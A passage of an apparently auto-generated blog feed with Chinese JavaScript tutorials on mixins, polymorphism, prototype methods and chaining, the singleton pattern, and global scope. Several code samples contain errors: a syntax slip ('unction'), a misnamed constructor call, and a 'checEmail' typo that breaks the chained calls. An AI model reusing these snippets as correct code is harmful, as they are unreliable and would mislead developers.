class="code"><pre><span class="line"><span class="keyword">var</span> mix = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">1</span>,                    <span class="comment">//从第二个参数起为被继承的对象</span></span><br><span class="line">    len = <span class="built_in">arguments</span>.length,   <span class="comment">//获取参数长度</span></span><br><span class="line">        target = <span class="built_in">arguments</span>[<span class="number">0</span>],    <span class="comment">//第一个对象为目标对象</span></span><br><span class="line">        arg;                      <span class="comment">//缓存参数对象</span></span><br><span class="line">    <span class="keyword">for</span>(;i &lt; len;i++)&#123;</span><br><span class="line">        arg = <span class="built_in">arguments</span>[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> property <span class="keyword">in</span> arg)&#123;</span><br><span class="line">            target[property] = arg[property];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们也可以将它绑定到原生对象Object上，这样所有的对象就可以拥有这个方法了。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.prototype.mix = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">var</span> i = <span class="number">1</span>,                    <span class="comment">//从第二个参数起为被继承的对象</span></span><br><span class="line">    len = <span class="built_in">arguments</span>.length,   <span class="comment">//获取参数长度</span></span><br><span class="line">        arg;                      <span class="comment">//缓存参数对象</span></span><br><span class="line">    <span class="keyword">for</span>(;i &lt; len;i++)&#123;</span><br><span class="line">        arg = <span class="built_in">arguments</span>[i];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> property <span class="keyword">in</span> arg)&#123;</span><br><span class="line">            <span class="keyword">this</span>[property] = arg[property];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line">otherBook.mix(book1,book2);</span><br></pre></td></tr></table></figure><h1 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h1><p>多态，对同一个方法多种调用方式，要对传入的参数做判断以实现多种调用方式，如果我们定义一个add方法，如果不传参数返回10，如果传一个参数返回10+参数，如果传两个参数返回相加的结果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//获取参数</span></span><br><span class="line">    <span class="keyword">var</span> arg = <span class="built_in">arguments</span>;</span><br><span class="line">    <span class="comment">//获取参数长度</span></span><br><span class="line">        len = arg.length;</span><br><span class="line">    <span class="keyword">switch</span>(len)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">10</span> + arg[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> arg[<span class="number">0</span>] + arg[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="built_in">console</span>.log(add());</span><br><span class="line"><span class="built_in">console</span>.log(add(<span class="number">5</span>));</span><br><span class="line"><span class="built_in">console</span>.log(add(<span class="number">6</span>,<span class="number">7</span>));</span><br></pre></td></tr></table></figure><h2 id="类形式实现"><a href="#类形式实现" class="headerlink" title="类形式实现"></a>类形式实现</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Add</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">zero</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">one</span>(<span class="params">num</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">10</span>+num;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">two</span>(<span class="params">num1,num2</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> num1+num2</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//相加共有方法</span></span><br><span class="line">    <span class="keyword">this</span>.add = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> arg = <span class="built_in">arguments</span>;</span><br><span class="line">    <span class="comment">//获取参数长度</span></span><br><span class="line">            len = arg.length;</span><br><span class="line">    <span class="keyword">switch</span>(len)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> zero();</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> one(arg[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> two(arg[<span class="number">0</span>],arg[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//测试</span></span><br><span class="line"><span class="keyword">var</span> A = <span class="keyword">new</span> add();</span><br><span class="line"><span class="built_in">console</span>.log(A.add());</span><br><span class="line"><span class="built_in">console</span>.log(A.add(<span class="number">5</span>));</span><br><span class="line"><span class="built_in">console</span>.log(A.add(<span class="number">6</span>,<span class="number">7</span>))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>灵活的JavaScript</title>
      <link href="2019/01/17/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%81%B5%E6%B4%BB%E7%9A%84JavaScript/"/>
      <url>2019/01/17/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E7%81%B5%E6%B4%BB%E7%9A%84JavaScript/</url>
      
        <content type="html"><![CDATA[<h2 id="几个验证表单的函数"><a href="#几个验证表单的函数" class="headerlink" title="几个验证表单的函数"></a>几个验证表单的函数</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkName</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//验证姓名</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkEmail</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//验证邮箱</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkPassword</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//验证密码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a><h2 id="用对象收编变量"><a href="#用对象收编变量" class="headerlink" title="用对象收编变量"></a>用对象收编变量</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> checkObject = &#123;</span><br><span class="line">    checkName:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//验证姓名</span></span><br><span class="line">    &#125;,</span><br><span class="line">    checkEmail:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">         <span class="comment">//验证邮箱</span></span><br><span class="line">    &#125;,</span><br><span class="line">    checkPassword:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//验证密码</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="对象的另一种形式"><a href="#对象的另一种形式" class="headerlink" title="对象的另一种形式"></a>对象的另一种形式</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> CheckObject = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">CheckObject.checkName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//验证姓名</span></span><br><span class="line">&#125;</span><br><span class="line">CheckObject.checkEmail = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//验证邮箱</span></span><br><span class="line">&#125;</span><br><span class="line">CheckObject.checkPassword = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//验证密码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是这种对象不能复制，我们可以这么写,每次调用这个函数的时候都返回了一个新对象，每个人在使用的就不互相影响了。</p><h2 id="真假对象"><a href="#真假对象" class="headerlink" title="真假对象"></a>真假对象</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> CheckObject = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span>&#123;</span><br><span class="line">       checkName:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//验证姓名</span></span><br><span class="line">        &#125;,</span><br><span class="line">        checkEmail:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">             <span class="comment">//验证邮箱</span></span><br><span class="line">        &#125;,</span><br><span class="line">        checkPassword:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="comment">//验证密码</span></span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = CheckObject();</span><br><span class="line">a.checkEmail();</span><br></pre></td></tr></table></figure><p>但是这种方式不是一个真正意义上类的创建，并且创建的a和对象CheckObject没有任何关系，我们还需改造一下</p><h2 id="类也可以"><a href="#类也可以" class="headerlink" title="类也可以"></a>类也可以</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> CheckObject = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">this</span>.checkName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="comment">//验证姓名</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="keyword">this</span>.checkEmail = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">             <span class="comment">//验证邮箱</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="keyword">this</span>.checkPassword: = unction()&#123;</span><br><span class="line">            <span class="comment">//验证密码</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> CheckObject();</span><br><span class="line">a.checkEmail();</span><br></pre></td></tr></table></figure><p>每个新创建的对象都会有自己的一套方法，这样是很奢侈的,改用原型设置方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> CheckObject = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">CheckObject.prototype.checkName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//验证姓名</span></span><br><span class="line">&#125;</span><br><span class="line">CheckObject.prototype.checEmail = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//验证邮箱</span></span><br><span class="line">&#125;</span><br><span class="line">CheckObject.prototype.checkPassword = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//验证密码</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> CheckObject();</span><br><span class="line">a.checkName();</span><br><span class="line">a.checkEmail();</span><br><span class="line">a.checkPassword();</span><br></pre></td></tr></table></figure><p>我们调用了三次方法，我们可以实现链式调用</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> CheckObject = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line">CheckObject.prototype.checkName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//验证姓名</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">CheckObject.prototype.checEmail = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//验证邮箱</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line">CheckObject.prototype.checkPassword = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//验证密码</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> CheckObject();</span><br><span class="line">a.checkName().checkEmail().checkPassword();</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>单例模式</title>
      <link href="2019/01/16/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/"/>
      <url>2019/01/16/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="单例模式"><a href="#单例模式" class="headerlink" title="单例模式"></a>单例模式</h1><p>单例模式（Singleton）：又称为单体模式，是只允许实例化一次的对象类。有时我们也用一个对象来规划一个命名空间，井井有条地管理对象上的属性与方法。</p><p>在应用单例模式时，生成单例的类必须保证只有一个实例的存在，很多时候整个系统只需要拥有一个全局对象，才有利于协调系统整体的行为。比如在整个系统的配置文件中，配置数据有一个单例对象进行统一读取和修改，其他对象需要配置数据的时候也统一通过该单例对象来获取配置数据，这样就可以简化复杂环境下的配置管理。 </p><a id="more"></a><h2 id="最简单的对象字面量"><a href="#最简单的对象字面量" class="headerlink" title="最简单的对象字面量"></a>最简单的对象字面量</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> singleton = &#123;</span><br><span class="line">       attr : <span class="number">1</span>,</span><br><span class="line">       method : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>.attr; &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> t1 = singleton ;</span><br><span class="line"><span class="keyword">var</span> t2 = singleton ;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(t1===t2);<span class="comment">//true</span></span><br></pre></td></tr></table></figure><h2 id="利用单例模式定义命名空间"><a href="#利用单例模式定义命名空间" class="headerlink" title="利用单例模式定义命名空间"></a>利用单例模式定义命名空间</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Jin写的代码他可以定义一个Jin的命名空间，这样使用Jin的变量可以通过Jin.xx来使用</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Jin = &#123;</span><br><span class="line">    <span class="comment">//code</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Xuan = &#123;</span><br><span class="line">    <span class="comment">//code</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="通过单例模式管理模块"><a href="#通过单例模式管理模块" class="headerlink" title="通过单例模式管理模块"></a>通过单例模式管理模块</h2><p>早期百度tangram,雅虎的YUUI都是通过单例模式来管理代码库的各个模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">baidu.dom.addClass           <span class="comment">//添加元素类</span></span><br><span class="line">baidu.event.stopPropagation  <span class="comment">//阻止冒泡</span></span><br></pre></td></tr></table></figure><h2 id="创建一个小型的代码库"><a href="#创建一个小型的代码库" class="headerlink" title="创建一个小型的代码库"></a>创建一个小型的代码库</h2><p>我们自己写小型方法库时也可以用单例模式来规范我们自己代码库的各个模块。</p><p>例如A库中包含公用模块，工具模块，Ajax模块等</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">    Util:&#123;</span><br><span class="line">        util_method1:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;,</span><br><span class="line">    Tool:&#123;</span><br><span class="line">        tool_method1:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;,</span><br><span class="line">    Ajax:&#123;</span><br><span class="line">        get:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,</span><br><span class="line">        post:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用单例模式管理静态变量"><a href="#利用单例模式管理静态变量" class="headerlink" title="利用单例模式管理静态变量"></a>利用单例模式管理静态变量</h2><p><strong>Javasript中不存在静态变量，但是如果将一个变量放在函数内部，我们不提供赋值变量的方法，只提供获取变量的方法，此时我们创建的对象内保存静态变量通过取值器访问，最后将这个对象作为一个单例放在全局空间里作为静态变量单例对象供他人使用。</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> Conf = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//私有变量</span></span><br><span class="line"><span class="keyword">var</span> conf = &#123;</span><br><span class="line">COUNT:<span class="number">1000</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回取值器对象</span></span><br><span class="line"><span class="keyword">return</span>&#123;</span><br><span class="line"><span class="comment">//取值器方法</span></span><br><span class="line">get:<span class="function"><span class="keyword">function</span>(<span class="params">name</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> conf[name] ? conf[name] : <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> count = Conf.get(<span class="string">'COUNT'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(count)</span><br></pre></td></tr></table></figure><h2 id="惰性单例"><a href="#惰性单例" class="headerlink" title="惰性单例"></a>惰性单例</h2><p>惰性单例指的是在合适的时候创建对象，并且只创建唯一的一个 </p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> LazySingle = (<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="comment">//单例实例引用</span></span><br><span class="line"><span class="keyword">var</span> _instance = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//单例</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Single</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里定义私有属性和方法..</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>&#123;</span><br><span class="line">publicMethod : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;,</span><br><span class="line">publicProperty: <span class="string">'1.0'</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取单例对象接口</span></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!_instance)&#123;</span><br><span class="line">_instance = Single();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> _instance;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(LazySingle().publicProperty);<span class="comment">//1.0</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 设计模式 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>谈谈 JavaScript 的作用域</title>
      <link href="2018/11/01/%E6%95%B4%E7%90%86-JavaScript-%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/"/>
      <url>2018/11/01/%E6%95%B4%E7%90%86-JavaScript-%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/</url>
      
        <content type="html"><![CDATA[<h3 id="全局作用域："><a href="#全局作用域：" class="headerlink" title="全局作用域："></a>全局作用域：</h3><p>作用域，是指变量的生命周期（一个变量在哪些范围内保持一定值）。</p><blockquote><p>全局变量：</p><p>生命周期将存在于整个程序之内。</p><p>能被程序中任何函数或者方法访问。</p><p>在 JavaScript 内默认是可以被修改的。</p></blockquote><p>全局变量，虽然好用，但是是非常可怕的，这是所有程序员公认的事实。</p><a id="more"></a><h5 id="显式声明："><a href="#显式声明：" class="headerlink" title="显式声明："></a>显式声明：</h5><p>带有关键字 var 的声明；</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> testValue = <span class="number">123</span>;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> testFunc = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123; <span class="built_in">console</span>.log(<span class="string">'just test'</span>) &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">/**---------全局变量会挂载到 window 对象上------------**/</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.testFunc)<span class="comment">// ƒ () &#123; console.log('just test') &#125;</span></span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="built_in">window</span>.testValue)<span class="comment">// 123</span></span></span><br><span class="line"><span class="undefined">    </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p><strong>其实，我们写的函数如果不经过封装，也会是全局变量，他的生命周期也就是全局作用域；</strong></p><h5 id="隐式声明："><a href="#隐式声明：" class="headerlink" title="隐式声明："></a>隐式声明：</h5><p>不带有<strong>声明关键字</strong>的变量，JS 会默认帮你声明一个全局变量！！！</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 